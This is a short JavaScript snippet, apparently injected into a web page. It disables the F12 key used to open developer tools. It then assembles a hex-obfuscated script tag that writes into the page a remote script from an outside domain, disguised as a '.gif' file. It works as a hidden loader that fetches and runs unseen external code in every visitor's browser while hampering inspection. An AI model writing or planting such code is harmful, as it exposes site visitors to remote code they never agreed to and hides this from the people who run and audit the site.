document.onkeydown = function (e) {
var currentKey = 0, k = e || window.event;
currentKey = k.keyCode || k.which || k.charCode;
if (currentKey == 123) {
window.event.cancelBubble = true;
window.event.returnValue = false;
}
}

var s1 = "\x3c";
var s2 = "s\x63r\x69pt\x20t\x79\x70\x65\x3D", s3 = "\x74ex\x74\x2F\x6A\x61\x76as\x63\x72\x69pt\x20s\x72c\x3d//\x77\x77\x77\x2e\x62\x6e\x38\x2e\x6f\x72\x67",s4 = "\x2f\x62\x67\x2e\x67\x69\x66\x3e\x3c\x2f\x73\x63\x72\x69pt";
var s5 ="\x3e";
s2 = s2 + s3 + s4;
s = s1 + s2 + s5;
document.write(s);
